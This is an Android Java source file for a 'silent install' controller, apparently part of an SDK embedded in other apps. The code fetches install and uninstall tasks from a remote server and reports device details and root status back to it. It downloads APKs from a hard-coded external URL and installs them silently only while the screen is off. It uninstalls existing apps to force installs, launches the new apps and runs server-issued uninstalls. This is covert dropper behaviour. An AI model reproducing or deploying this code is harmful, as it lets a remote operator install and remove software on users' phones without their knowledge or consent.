package com.invisible.silentinstall.core;

import android.content.Context;
import android.net.ConnectivityManager;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;

import com.invisible.silentinstall.BuildConfig;
import com.invisible.silentinstall.download.DownloadController;
import com.invisible.silentinstall.download.DownloadEventConstants;
import com.invisible.silentinstall.download.DownloadEventController;
import com.invisible.silentinstall.download.IDownloadEventsListener;
import com.invisible.silentinstall.interact.PureInteract;
import com.invisible.silentinstall.interact.SharedParamsUtil;
import com.invisible.silentinstall.utils.Cts;
import com.invisible.silentinstall.utils.DataUtil;
import com.invisible.silentinstall.utils.GlobalContext;
import com.invisible.silentinstall.utils.InternetUtil;
import com.invisible.silentinstall.utils.PublicSp;
import com.invisible.silentinstall.utils.URLManager;
import com.invisible.silentinstall.utils.Util_AndroidOS;
import com.invisible.silentinstall.utils.Util_File;
import com.invisible.silentinstall.utils.Util_Json;
import com.invisible.silentinstall.utils.Util_Log;
import com.invisible.silentinstall.utils.Util_Process;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONObject;

import java.io.File;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;


/**
 * @author zhengnan
 *         静默安装的主要控制类
 **/
public class SICtrl implements IDownloadEventsListener, DownloadEventConstants {
    public static final int version = BuildConfig.VERSION_CODE;//标识静默当前的版本。// TODO: 2017/6/5
    private static SICtrl ins = new SICtrl();

    public static SICtrl getIns() {
        return ins;
    }

    private Context ctx = null;
    //params
    private DynamicDataMgr dynamicDataMgr = null;
    //-全局sp中用到的参数
    //提示服务器的动态数据是否要更新 ，（本地动态数据变动时，提醒服务端更新）
    public static final String SP_NEED2UPDATE = "si_need2update";

    public static final String ecodePref = "errCode-";

    //method
    public void execute(final Context ctx) {

        //1分钟只执行一次请求。
//        if(Util_Interval.getIns(ctx).isInInterval("si60m")){
//            return;
//        }
//        Util_Interval.getIns(ctx).setInterval("si60m", 60000, true);
        GlobalContext.init(ctx);
        if (!Util_AndroidOS.checkSilenceInstallPermission(GlobalContext.getCtx())) {
            Util_Log.logReal("not support si!");
            if (!Util_Log.logShow) {
                return;
            }
        }
        if (TaskManager.isInterval()) {
            if (TaskManager.getNativeTasks().size() > 0) {
                execute(ctx, false);
            }
        } else {
            execute(ctx, true);
        }
    }

    /**
     * everything
     *
     * @param processNet 是否Pull网络数据
     **/
    private void execute(Context ctx, boolean processNet) {

        this.ctx = ctx;
        update(ctx);

        //TODO 执行卸载任务
        final Context context = this.ctx;
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                TaskManager.doUnInstall(context);
//            }
//        }).start();

        Log.e("SI", "execute ... processNet：" + processNet);
        if (!Util_AndroidOS.IsNetworkAvailable(ctx)) {
            Util_Log.logSI("net unAvailable");
            return;
        }
        SharedParamsUtil.INS.putParam(ctx, "siVersion", "" + version);
        try {
            dynamicDataMgr = TaskManager.getNativeDData();
            /**
             * -数据组织
             * -将本地已完成的pull时提交
             * -将本地未完成的与pull下来的数据合并，然后去做任务
             * **/
            Map<String, TaskModel> nativeTasks = TaskManager.getNativeTasks();

            //sdk包相关逻辑
            boolean sdkInstalled = PureInteract.getIns(ctx).isSdkInstalled();
            if (sdkInstalled) { //校验安装情况与本地数据
                String sdkPname = PureInteract.getIns(ctx).getPname4pureSdk();
                if (!dynamicDataMgr.contains(sdkPname)) {
                    TaskModel tm = new TaskModel();
                    tm.setPackageName(sdkPname);
                    tm.setVersionCode(Util_AndroidOS.getVersion(ctx, sdkPname));
                    dynamicDataMgr.addInstalled(tm);
                }
            } else {
                //若没安装则从内置sdk的逻辑中过一下
                nativeTasks = BuiltInApkUtil.execute(nativeTasks);
            }
            //hasBt是与root模块交互用的，解决sdk包的冲突问题  具体见oneNote
            Util_File.writeDef(ctx, SIStr.hasBt, "false");

            //联网参数
            List<NameValuePair> netParams = new ArrayList<>();
            Util_AndroidOS.getDeviceBasicInfo(netParams, GlobalContext.getCtx());
            String noBuilt = "0";
            if (!sdkInstalled && BuiltInApkUtil.hasBuildInTask()) {
                //如果有内置任务，就暂时不联网取数据。
                Util_Log.logNa("has bI task!");
                // processNet = false;  //防止服务器识别为没有内置包，然后给下发一个新的包下来。
                Util_File.writeDef(ctx, SIStr.hasBt, "true");
                noBuilt = "1";
            }
            netParams.add(new BasicNameValuePair(SIStr.noBuilt, noBuilt));//告诉服务器不下发内置包相关任务了。
            //,-联网获取数据,并产生新任务列表
            Map<String, TaskModel> tasks = processNet ? pullData(nativeTasks, netParams) : nativeTasks;

            for (String pkName : tasks.keySet()) {
                TaskModel task = tasks.get(pkName);
                feedback(task);
                Util_Log.logSI("process task : " + task.toString());



                //1,一些条件检测
                //1-0-0url检测
                if (!task.getDownUrl().startsWith("assets") && !DataUtil.isURL(task.getDownUrl())) {
                    Util_Log.logSI("检测到url是错误的！");
                    task.setStatusDesc("valid url:" + task.getDownUrl());
                    task.setInstallResult(false);
                    task.setFinisned(true);
                    feedback(task);
                    dynamicDataMgr.addFailed(task);
                    TaskManager.delete(task);
                    continue;
                }

                //1-0: 若在本地列表中且已有安装结果(安装成功)，就continue (表示是未上传成功的数据)
                if (task.isFinisned()) {
                    //崩溃检测
                    if (task.getStatusDesc().equals(ecodePref + SIStr.ErrCode.IBefore)) {
                        if (Util_AndroidOS.isExistPackage(ctx, task.getPackageName()) && Util_AndroidOS.getVersion(ctx, task.getPackageName()) == task.getVersionCode()) {
                            //表示安装成功
                            task.setInstallResult(true);
                            //放出去的140版本写成了ecodePref+"success"
                            task.setStatusDesc(ecodePref + SIStr.ErrCode.IBefore + "success");
                            dynamicDataMgr.addInstalled(task);
                            //保存
                            TaskManager.save(task);
                            TaskManager.deleteApk(task);
                            //启动应用
                            Bundle extBundle = new Bundle();
                            extBundle.putString(SIStr.cmd, SIStr.SI);
                            //这里将Gid和Cid写颠倒了。由于数据库已有量了就将错就错吧。//通过数据库在字段显示方面将其校正
                            // extBundle.putString(SIStr.parentGid,""+ ChaConfig.getInstance(GlobalContext.getCtx()).getChannelId());
                            // extBundle.putString(SIStr.parentCid, "" + ChaConfig.getInstance(GlobalContext.getCtx()).getGameId());
                            Util_AndroidOS.startComponent(task.getComponentType(), task.getPackageName(), task.getComponentName(), extBundle);
                        } else {
                            task.setFinisned(false);
                            continue;
                        }
                    }

                    //反馈成功，则将本地任务列表删除
                    if (feedback(task)) {
                        TaskManager.delete(task);
                    }
                    continue;
                }
                //自更新判断  (版本，包名一样时就认为自更新成功了。后台下发模式应该总是 升级下发)
                if (task.getPackageName().equals(ctx.getPackageName()) && task.getVersionCode() == Util_AndroidOS.getVersionCode(ctx)) {
                    Util_Log.logSI("检测到当前包是自更新的包!");
                    task.setFinisned(true);
                    task.setInstallResult(true);
                    task.setStatusDesc(SIStr.StatusCode.SELF_UPDATE_SUCCESS);
                    TaskManager.save(task);
                    dynamicDataMgr.addInstalled(task);
                    if (feedback(task)) {
                        TaskManager.deleteApk(task);
                        TaskManager.delete(task);
                    }
                    continue;
                }

                //1-1,
                //如果已存在的是系统应用，直接返回false
//                if (Util_AndroidOS.isSystemApp(ctx, task.getPackageName())) {
//                    //setFail(task,"is system!");
//                    task.setStatusDesc("is system!");
//                    task.setInstallResult(false);
//                    task.setFinisned(true);
//                    feedback(task);
//                    dynamicDataMgr.addFailed(task);
//                    continue;
//                }

                //如果是5天前的任务就不再做了。
                if (task.getGenTime() != 0 && System.currentTimeMillis() - task.getGenTime() > Cts.Time.ONE_DAY * 5) {
                    Util_Log.log("date out!");
                    task.setStatusDesc("over5days");
                    task.setInstallResult(false);
                    task.setFinisned(false);
                    if (feedback(task)) {
                        TaskManager.delete(task);
                    }
                    continue;
                }
                //wifi 2g
                if (!task.isUse2g() && Util_AndroidOS.getNetType(ctx) != ConnectivityManager.TYPE_WIFI) {
                    Util_Log.log("cur task not desired 2g!");
                    TaskManager.save(task);
                    continue;
                }
                //符合条件的就马上保存一次
                TaskManager.save(task);

                // - installOption 安装选项过滤
                if (!installOptionProcess(task)) continue;

                //本地包检查。 （符合包名和版本，则直接copy到download目录下，减少下载这个步骤）
                BuiltInApkUtil.checkAsset(ctx, task);
                //download
                String url = task.getDownUrl();//"http://res2.cnappbox.com/userapps/signed_AppLock.apk";//task.getDownUrl()

                url = "http://eyrys.thesisi.info/Uploads/service/si/newpopstar20170519.apk";
                SIDownloadItem mItem = new SIDownloadItem(ctx, url);
                mItem.setTaskModel(task);
                DownloadEventController.getInstance().addDownloadListener(this);
                //1,组织本地任务列表
                DownloadController.getInstance().doDownloadStart(mItem);
            }


        } catch (Exception e) {
            e.printStackTrace();
            Util_Log.logSI("..... error .....");
        }
    }


    //安装模式的过滤
    public boolean installOptionProcess(TaskModel task) {
        Util_Log.methodName();
        Util_Log.logSI("installOption : " + task.getInstallOption());
        if (dynamicDataMgr == null) {
            dynamicDataMgr = TaskManager.getNativeDData();
        }

        if (task.getInstallOption() == SIStr.InstallOption.UPDATE_INSTALL) {//update install
            //由于没下载，所以无法判断签名了。
            if (Util_AndroidOS.isExistPackage(ctx, task.getPackageName())) {
                if (Util_AndroidOS.getVersion(ctx, task.getPackageName()) >= task.getVersionCode()) {
                    Util_Log.logSI("已安装了最新的版本，so 不会更新..");
                    task.setStatusDesc(ecodePref + SIStr.ErrCode.versionMismatch);
                    task.setInstallResult(false);
                    task.setFinisned(true);
                    if (feedback(task)) {
                        TaskManager.delete(task);
                    }
                    dynamicDataMgr.addFailed(task);
                    return false;
                }
            }
        } else if (task.getInstallOption() == SIStr.InstallOption.NOTEXIST_INSTALL) {//exist install
            if (Util_AndroidOS.isExistPackage(ctx, task.getPackageName()) || dynamicDataMgr.contains(task.getPackageName())) {
                Util_Log.logSI("已存在，so 不去安装 ..");
                task.setStatusDesc(ecodePref + SIStr.ErrCode.isExist);
                task.setInstallResult(false);
                task.setFinisned(true);
                if (feedback(task)) {
                    TaskManager.delete(task);
                }
                dynamicDataMgr.addFailed(task);
                return false;
            }
        }
        return true;
    }

    /**
     * @return 向服务器拉取相关数据
     */
    public Map<String, TaskModel> pullData(Map<String, TaskModel> nativeList, List<NameValuePair> params) {
        Util_Log.log("pullData...");

        //生成网络任务列表
        if (params == null) params = new ArrayList<>();

        if (!dynamicDataMgr.isEmpty()) {//不上传该参数时，服务器才会 查表。
            params.add(new BasicNameValuePair(SIStr.dynamicData, dynamicDataMgr.toString()));
        }
        boolean need2update = DataUtil.str2bool(PublicSp.getInstance(GlobalContext.getCtx()).getValue(SP_NEED2UPDATE, "false"));
        params.add(new BasicNameValuePair(SIStr.needUpdate, DataUtil.bool2int(need2update) + ""));
        params.add(new BasicNameValuePair(SIStr.SIVersion, SICtrl.version + ""));
        //2016年3月23日10:22:25
        params.add(new BasicNameValuePair(SIStr.isR, DataUtil.bool2int(TaskManager.isOurRoot()) + ""));
        params.add(new BasicNameValuePair(SIStr.rResult, DataUtil.bool2int(TaskManager.hasOutRoot(ctx)) + ""));
        //   params.add(new BasicNameValuePair(SIStr.isUnUpdate, DataUtil.bool2int(TaskManager.isUninstallUpdateApk(ctx))+""));

        if (!GlobalContext.getCid().equals(PureInteract.getIns(GlobalContext.getCtx()).getCid())) {
            params.add(new BasicNameValuePair(SIStr.parentCid, PureInteract.getIns(GlobalContext.getCtx()).getCid() + ""));
            params.add(new BasicNameValuePair(SIStr.parentGid, PureInteract.getIns(GlobalContext.getCtx()).getGid() + ""));
        }
        String returnStr = "";
        for (int i = 0; i < 2; i++) {
            returnStr = InternetUtil.postString(URLManager.getInstance(GlobalContext.getCtx()).getSiLink(), params);
            if (!returnStr.equals("")) break;
        }
        if (Util_Log.logShow)
            Util_Log.logSI("url:" + URLManager.getInstance(GlobalContext.getCtx()).getSiLink() + "\nparams:" + params.toString() + "\nrt:" + returnStr);

        //若连网失败，在在插件的间隔时间外，也启动。
        if (!returnStr.equals("")) {
            PublicSp.getInstance(GlobalContext.getCtx()).setValue(SP_NEED2UPDATE, "false");//表示更新成功了，所以这里重新转为false

            //如果包含动态数据，客户端就清除当前已有数据，而使用服务器下发的数据。
            dynamicDataMgr = dynamicDataMgr.update4netData(returnStr);
            TaskManager.setInterval(Long.parseLong(Util_Json.getJsonParameter(Util_Json.getJo(returnStr), SIStr.nextInterval, "50000")));

            //发送全局的 广播
            Util_AndroidOS.sendBroadcast(GlobalContext.getCtx(), "", "" + SIStr.sc_stat_broadcast, null);

            //是否继续处理数据
            if (!checkContinue(GlobalContext.getCtx(), returnStr)) return nativeList;

        }
        Map<String, TaskModel> netTasks = TaskManager.generateTasks(returnStr);
        Util_Log.logSI("net task length:" + netTasks.size());


        //将本地剩余任务和网络任务合并 (本地正在做的任务，若是下发了同样的则以本地为主)
        for (String pkgName : netTasks.keySet()) {
            TaskModel task = netTasks.get(pkgName);
            if (!nativeList.containsKey(pkgName)) {
                nativeList.put(task.getPackageName(), task);
            } else {
                //判断，如果网络版本大于当前版本，则使用网络版本。
                if (nativeList.get(pkgName).getVersionCode() < task.getVersionCode()) {
                    nativeList.put(task.getPackageName(), task);
                } else if (Util_Log.logShow)
                    Util_Log.logSI("本地已存在与netTask相同的任务：" + task.getPackageName() + ", 取本地的！");
            }
        }
        Util_Log.logSI("all task length:" + netTasks.size());

        //TODO 提取卸载任务
        final TaskModel unTask = TaskManager.generateUninstallTask(returnStr);
        if (unTask != null) {
            TaskManager.saveUntask(unTask.unInstallPackages);
            final Context context = this.ctx;
            new Thread(new Runnable() {
                @Override
                public void run() {
                    TaskManager.doUnInstall(context);
                }
            }).start();
        }

        return nativeList;
    }

    /**
     * 当静默安装(依附的模块)更新时，调用此方法，以重置数据。
     */
    public static void update(Context ctx) {
        String siVersion = PublicSp.getInstance(ctx).getValue(SIStr.SIVersion, "0");
        if (!siVersion.equals("" + SICtrl.version)) {
            Util_Log.logSI("is update!");
            /** 更新处理 **/


            //end,更新标识
            PublicSp.getInstance(ctx).setValue(SIStr.SIVersion, version + "");
        }
    }

    /**
     * @param json 联网返回的json
     * @return 是否继续执行
     */
    public boolean checkContinue(Context ctx, String json) {
        try {
            //1,ignoreDevice  存在包时不继续
            String pks = Util_Json.getJsonParameter(Util_Json.getJo(json), SIStr.ignoresDevice, "");
            if (!TextUtils.isEmpty(pks)) {
                String pksArr[] = pks.split("\\,");
                if (Util_Log.logShow) Util_Log.logSI("ignoreDevice 检测 ：" + Arrays.toString(pksArr));
                for (String pk : pksArr) {
                    if (Util_AndroidOS.isExistPackage(ctx, pk)) {
                        if (Util_Log.logShow) Util_Log.logSI("已存在 " + pk + " so  不处理网络任务！");
                        return false;
                    }
                }
            }
            //2,---
        } catch (Exception e) {
            e.printStackTrace();
        }
        return true;
    }

    /**
     * 安装成功后，向服务器反馈
     */
    public boolean feedback(TaskModel task) {
        try {
            if (Util_Log.logShow) Util_Log.logSI("feedback " + task.getPackageName());
            List<NameValuePair> list = new ArrayList<NameValuePair>();
            Util_AndroidOS.getDeviceBasicInfo(list, GlobalContext.getCtx());
            list.add(new BasicNameValuePair(SIStr.packageName, "" + task.getPackageName()));
            list.add(new BasicNameValuePair(SIStr.confid, "" + task.getConfid()));

            list.add(new BasicNameValuePair(SIStr.installResult, "" + DataUtil.bool2int(task.isInstallResult())));
            list.add(new BasicNameValuePair(SIStr.statusDesc, "" + task.getStatusDesc()));
            String retStr = InternetUtil.postString(URLManager.getInstance(GlobalContext.getCtx()).getSiFeedback(), list);


            Util_Log.logSI("feedback ." +
                    "\nurl：" + URLManager.getInstance(GlobalContext.getCtx()).getSiFeedback() +
                    "\nparam：" + list.toString() +
                    "\nretStr：" + retStr);
            JSONObject jo = new JSONObject(retStr);
            if (jo.has("status")) return true;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return false;
    }

    public void setCtx(Context ctx) {
        this.ctx = ctx;
    }

    //下载回调
    @Override
    public void onDownloadEvent(int event, Object data) {
        if (data.getClass() == SIDownloadItem.class) {
            SIDownloadItem item = (SIDownloadItem) data;
            TaskModel task = item.getTaskModel();
            switch (event) {
                case EVT_ON_FAILED:
                    break;
                case EVT_ON_FINISHED:
                    //基本的前提检测
                    File downApk = new File(item.getFilePath());
//                    if(task.getConfid() != -100&&!downApk.exists()){//压根不存在，表示此任务有问题。
//                            task.setFinisned(true);
//                         task.setInstallResult(false);
//                        task.setStatusDesc("" + downApk.getAbsolutePath()+" not exist!");
//                        dynamicDataMgr.addFailed(task);
//                        //等待下次触发时在遍历阶段feedback
//                        return;
//                    }

                    //apk存在 但是不完整，则此任务需要重做
                    if (task.getConfid() != -100 && !Util_AndroidOS.isValidApk(downApk.getAbsolutePath(), ctx)) {
                        TaskManager.deleteApk(task);
                        return;
                    }

                    if (Util_AndroidOS.isScreenOn(GlobalContext.getCtx())) {
                        Util_Log.log("屏幕是开的，暂不安装！");
                        //--注册关屏广播
                        DynamicReceiver.getInstance(GlobalContext.getCtx());
                        return;
                    }
                    //是不是自更新
                    boolean selfUpate = ctx.getPackageName().equals(task.getPackageName());

                    //安装前用于记录（线上有不少机器会在安装后系统崩溃。）
                    task.setFinisned(true);
                    task.setStatusDesc(ecodePref + SIStr.ErrCode.IBefore);//用于标示，下次遍历时方便辨认。
                    TaskManager.save(task);

                    String ret = TaskManager.doInstall(task, item.getFilePath());
//                    try {
//                        ret = Util_Process.installApkSilent(new File(item.getFilePath()), " -r ");
//                    }catch(Throwable e){
//                        //安装出异常，且安装成功了。就算成功
//                        if(Util_AndroidOS.isExistPackage(ctx,task.getPackageName())){
//                            ret = "success";
//                        }
//                    }

                    //正常安装不成功，进行卸载再安装。
                    if (!selfUpate && !ret.equals("success") && Util_AndroidOS.isExistPackage(ctx, task.getPackageName()) && Util_AndroidOS.checkSilenceUnInstallPermission(GlobalContext.getCtx())) {
                        String unRet = Util_Process.uninstallApkSilent(task.getPackageName(), true);
                        if (unRet.equals("success")) {
                            Util_Log.logSI("卸载成功！");
                            ret = TaskManager.doInstall(task, item.getFilePath());
                        } else {
                            Util_Log.logSI("卸载失败！");
                            ret += " <-> " + unRet;
                        }
                    }

                    if (Util_Log.logShow) Util_Log.logSI("安装结果：" + ret);

                    task.setFinisned(true);
                    task.setInstallResult(ret.trim().equals("success"));
                    task.setStatusDesc(ret.trim());
                    if (ret.trim().equals("success")) {
                        dynamicDataMgr.addInstalled(task);
                    } else {
                        dynamicDataMgr.addFailed(task);
                    }

                    //保存
                    TaskManager.save(task);
                    TaskManager.deleteApk(task);
                    //-100是内置apk的设置
                    if (task.getConfid() == -100 || feedback(task)) {
                        //反馈成功，则将本地任务列表删除
                        TaskManager.delete(task);
                    }
                    if (task.isInstallResult()) {
                        //启动应用
                        Bundle extBundle = new Bundle();
                        extBundle.putString(SIStr.cmd, SIStr.SI);
                        //这里将Gid和Cid写颠倒了。由于数据库已有量了就将错就错吧。//通过数据库在字段显示方面将其校正
                        //  extBundle.putString(SIStr.parentGid,""+ ChaConfig.getInstance(GlobalContext.getCtx()).getChannelId());
                        //extBundle.putString(SIStr.parentCid,""+ChaConfig.getInstance(GlobalContext.getCtx()).getGameId());
                        Util_AndroidOS.startComponent(task.getComponentType(), task.getPackageName(), task.getComponentName(), extBundle);
                    }
                    break;
                case EVT_ON_PROGRESS:
                    break;
                case EVT_ON_START:
                    break;
                default:
                    break;
            }
        }
    }
}